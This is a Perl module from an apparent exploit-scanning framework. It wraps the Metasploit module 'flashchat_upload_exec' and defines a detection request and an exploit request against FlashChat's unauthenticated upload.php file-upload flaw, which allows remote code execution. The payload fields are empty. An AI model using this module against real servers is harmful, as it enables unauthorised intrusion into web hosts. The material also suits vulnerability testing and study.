package MSFExploits::Exploits::FLASHCHAT::MSF::FlashchatUploadExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::FLASHCHAT);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "FlashchatUploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/upload.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /upload.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a file upload vulnerability found in FlashChat

        versions 6.0.2 and 6.0.4 to 6.0.8. Attackers can abuse the upload

        feature in order to upload malicious PHP files without authentication

        which results in arbitrary remote code execution as the web server user.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "flashchat_upload_exec",
  OSVDB       => 98233,
  PATH        => "upload.php?",
  PATHS       => ["upload.php", "chat/"],
  PAYLOAD     => "",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to FlashChat", VALUE => "/chat/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'upload.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /upload.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_835_2954500658_1454864042',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
